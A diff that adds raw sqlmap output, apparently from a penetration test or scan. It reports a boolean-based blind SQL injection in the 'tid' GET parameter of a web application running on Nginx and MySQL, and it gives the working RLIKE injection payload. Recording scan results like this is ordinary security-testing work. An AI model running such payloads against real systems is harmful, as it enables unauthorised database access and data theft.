@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 703 HTTP(s) requests:
+---
+Parameter: tid (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: act=search&tid=1 RLIKE (SELECT (CASE WHEN (7724=7724) THEN 1 ELSE 0x28 END))&ydh=987-65-4329
+---
+web application technology: Nginx
+back-end DBMS: MySQL
